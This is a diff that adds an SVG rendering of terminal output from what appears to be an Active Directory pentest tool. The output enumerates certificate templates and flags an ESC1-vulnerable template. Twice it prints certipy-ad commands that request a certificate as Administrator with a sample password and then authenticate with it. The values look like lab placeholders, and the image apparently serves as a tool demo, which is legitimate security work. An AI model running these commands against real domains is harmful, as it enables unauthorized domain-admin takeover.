@@ -1,0 +1,83 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="1586" height="925" viewBox="0 0 1586 925" font-family='ui-monospace,"Cascadia Code","Source Code Pro",Menlo,Consolas,monospace' font-size="14">
+<rect width="1586" height="925" rx="6" fill="#0d1117"/>
+<text x="16.0" y="30" fill="#c9d1d9" xml:space="preserve">  ██╗     ██╗███████╗████████╗██████╗  █████╗ ██████╗ </text>
+<text x="16.0" y="49" fill="#c9d1d9" xml:space="preserve">  ██║     ██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗</text>
+<text x="16.0" y="68" fill="#c9d1d9" xml:space="preserve">  ██║     ██║███████╗   ██║   ██║  ██║███████║██████╔╝</text>
+<text x="16.0" y="87" fill="#c9d1d9" xml:space="preserve">  ██║     ██║╚════██║   ██║   ██║  ██║██╔══██║██╔═══╝ </text>
+<text x="16.0" y="106" fill="#c9d1d9" xml:space="preserve">  ███████╗██║███████║   ██║   ██████╔╝██║  ██║██║     </text>
+<text x="16.0" y="125" fill="#c9d1d9" xml:space="preserve">  ╚══════╝╚═╝╚══════╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝     </text>
+<text x="16.0" y="163" fill="#39c5cf" xml:space="preserve">[*]</text>
+<text x="41.2" y="163" fill="#c9d1d9" xml:space="preserve"> Connecting to 10.10.10.10:636 (LDAPS)</text>
+<text x="16.0" y="201" fill="#3fb950" font-weight="bold" xml:space="preserve">  ✔ Connected</text>
+<text x="16.0" y="220" fill="#c9d1d9" xml:space="preserve">    </text>
+<text x="49.6" y="220" fill="#39c5cf" xml:space="preserve">Target:</text>
+<text x="108.4" y="220" fill="#c9d1d9" xml:space="preserve">  10.10.10.10:636</text>
+<text x="16.0" y="239" fill="#c9d1d9" xml:space="preserve">    </text>
+<text x="49.6" y="239" fill="#39c5cf" xml:space="preserve">Auth:</text>
+<text x="91.6" y="239" fill="#c9d1d9" xml:space="preserve">  </text>
+<text x="108.4" y="239" fill="#3fb950" xml:space="preserve">Kerberos (GSSAPI)</text>
+<text x="16.0" y="258" fill="#c9d1d9" xml:space="preserve">    </text>
+<text x="49.6" y="258" fill="#39c5cf" xml:space="preserve">Base DN:</text>
+<text x="116.8" y="258" fill="#c9d1d9" xml:space="preserve">  DC=corp,DC=local</text>
+<text x="16.0" y="296" fill="#58a6ff" font-weight="bold" xml:space="preserve">╔════════════════════════════════════════════════════════════╗</text>
+<text x="16.0" y="315" fill="#58a6ff" font-weight="bold" xml:space="preserve">║                ADCS — CERTIFICATE SERVICES                 ║</text>
+<text x="16.0" y="334" fill="#58a6ff" font-weight="bold" xml:space="preserve">╚════════════════════════════════════════════════════════════╝</text>
+<text x="16.0" y="353" fill="#3fb950" xml:space="preserve">[+]</text>
+<text x="41.2" y="353" fill="#c9d1d9" xml:space="preserve"> 1 Certificate Authority(ies) found</text>
+<text x="16.0" y="372" fill="#39c5cf" xml:space="preserve">[*]</text>
+<text x="41.2" y="372" fill="#c9d1d9" xml:space="preserve"> </text>
+<text x="49.6" y="372" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Certificate Templates</text>
+<text x="226.0" y="372" fill="#c9d1d9" xml:space="preserve">: </text>
+<text x="242.8" y="372" fill="#f0f6fc" font-weight="bold" xml:space="preserve">34</text>
+<text x="259.6" y="372" fill="#c9d1d9" xml:space="preserve"> total</text>
+<text x="16.0" y="410" fill="#39c5cf" font-weight="bold" xml:space="preserve">  ── CA: CORP-CA ──</text>
+<text x="16.0" y="429" fill="#c9d1d9" xml:space="preserve">    </text>
+<text x="49.6" y="429" fill="#39c5cf" xml:space="preserve">Hostname:</text>
+<text x="125.2" y="429" fill="#c9d1d9" xml:space="preserve">  DC01.corp.local</text>
+<text x="16.0" y="448" fill="#c9d1d9" xml:space="preserve">    </text>
+<text x="49.6" y="448" fill="#39c5cf" xml:space="preserve">Published templates:</text>
+<text x="217.6" y="448" fill="#c9d1d9" xml:space="preserve">  12</text>
+<text x="16.0" y="467" fill="#3fb950" xml:space="preserve">[+]</text>
+<text x="41.2" y="467" fill="#c9d1d9" xml:space="preserve"> ESC7: no non-privileged CA management rights on CORP-CA (via RRP)</text>
+<text x="16.0" y="505" fill="#39c5cf" font-weight="bold" xml:space="preserve">  ── ESC1 — Enrollee Supplies Subject + Client Auth EKU ──</text>
+<text x="16.0" y="524" fill="#c9d1d9" xml:space="preserve">    </text>
+<text x="49.6" y="524" fill="#d29922" font-weight="bold" xml:space="preserve">Welcome-Template</text>
+<text x="16.0" y="543" fill="#c9d1d9" xml:space="preserve">      </text>
+<text x="66.4" y="543" fill="#39c5cf" xml:space="preserve">    EKUs:</text>
+<text x="142.0" y="543" fill="#c9d1d9" xml:space="preserve">  1.3.6.1.5.5.7.3.1, 1.3.6.1.5.5.7.3.2</text>
+<text x="16.0" y="562" fill="#c9d1d9" xml:space="preserve">      </text>
+<text x="66.4" y="562" fill="#39c5cf" xml:space="preserve">    Enrollable by:</text>
+<text x="217.6" y="562" fill="#c9d1d9" xml:space="preserve">  corp.local\svc_ca</text>
+<text x="16.0" y="581" fill="#c9d1d9" xml:space="preserve">      </text>
+<text x="66.4" y="581" fill="#39c5cf" xml:space="preserve">    Exploit:</text>
+<text x="167.2" y="581" fill="#c9d1d9" xml:space="preserve">  </text>
+<text x="16.0" y="600" fill="#c9d1d9" xml:space="preserve">        </text>
+<text x="83.2" y="600" fill="#3fb950" xml:space="preserve">certipy-ad req -u &#x27;svc_ca@corp.local&#x27; -p &#x27;P@ssw0rd!&#x27; -dc-ip 10.10.10.10 -ca &#x27;CORP-CA&#x27; -template &#x27;Welcome-Template&#x27; -upn &#x27;Administrator@corp.local&#x27;</text>
+<text x="16.0" y="619" fill="#c9d1d9" xml:space="preserve">        </text>
+<text x="83.2" y="619" fill="#3fb950" xml:space="preserve">certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.10.10</text>
+<text x="16.0" y="657" fill="#39c5cf" font-weight="bold" xml:space="preserve">  ── ESC1 (config) — not enrollable by current identity ──</text>
+<text x="16.0" y="676" fill="#c9d1d9" xml:space="preserve">    </text>
+<text x="49.6" y="676" fill="#c9d1d9" opacity="0.65" xml:space="preserve">Subordinate Certification Authority</text>
+<text x="16.0" y="695" fill="#c9d1d9" xml:space="preserve">      </text>
+<text x="66.4" y="695" fill="#39c5cf" xml:space="preserve">    Enrollment rights:</text>
+<text x="251.2" y="695" fill="#c9d1d9" xml:space="preserve">  Domain Admins, Enterprise Admins</text>
+<text x="16.0" y="714" fill="#39c5cf" xml:space="preserve">[*]</text>
+<text x="41.2" y="714" fill="#c9d1d9" xml:space="preserve"> Above templates match ESC1 config but the current identity cannot enroll — exploitable only after gaining one of the listed identities, or via ESC4 if you can edit the template ACL.</text>
+<text x="16.0" y="752" fill="#58a6ff" font-weight="bold" xml:space="preserve">╔════════════════════════════════════════════════════════════╗</text>
+<text x="16.0" y="771" fill="#58a6ff" font-weight="bold" xml:space="preserve">║                         QUICK WINS                         ║</text>
+<text x="16.0" y="790" fill="#58a6ff" font-weight="bold" xml:space="preserve">╚════════════════════════════════════════════════════════════╝</text>
+<text x="16.0" y="809" fill="#c9d1d9" xml:space="preserve">  </text>
+<text x="32.8" y="809" fill="#ff7b72" font-weight="bold" xml:space="preserve">[CRITICAL]</text>
+<text x="116.8" y="809" fill="#c9d1d9" xml:space="preserve"> </text>
+<text x="125.2" y="809" fill="#c9d1d9" font-weight="bold" xml:space="preserve">ESC1 — 1 vulnerable template(s)</text>
+<text x="16.0" y="828" fill="#c9d1d9" xml:space="preserve">         </text>
+<text x="91.6" y="828" fill="#c9d1d9" opacity="0.65" xml:space="preserve">Allows requesting a certificate with an arbitrary SAN (e.g., Domain Admin UPN).</text>
+<text x="16.0" y="847" fill="#c9d1d9" xml:space="preserve">         </text>
+<text x="91.6" y="847" fill="#c9d1d9" opacity="0.65" xml:space="preserve">Enrollable by a principal the current identity controls:</text>
+<text x="16.0" y="866" fill="#c9d1d9" xml:space="preserve">         </text>
+<text x="91.6" y="866" fill="#c9d1d9" opacity="0.65" xml:space="preserve">  - Welcome-Template  (enrollable by: corp.local\svc_ca)</text>
+<text x="16.0" y="885" fill="#c9d1d9" xml:space="preserve">         </text>
+<text x="91.6" y="885" fill="#c9d1d9" opacity="0.65" xml:space="preserve">      certipy-ad req -u &#x27;svc_ca@corp.local&#x27; -p &#x27;P@ssw0rd!&#x27; -dc-ip 10.10.10.10 -ca &#x27;CORP-CA&#x27; -template &#x27;Welcome-Template&#x27; -upn &#x27;Administrator@corp.local&#x27;</text>
+<text x="16.0" y="904" fill="#c9d1d9" xml:space="preserve">         </text>
+<text x="91.6" y="904" fill="#c9d1d9" opacity="0.65" xml:space="preserve">      certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.10.10</text>
+</svg>
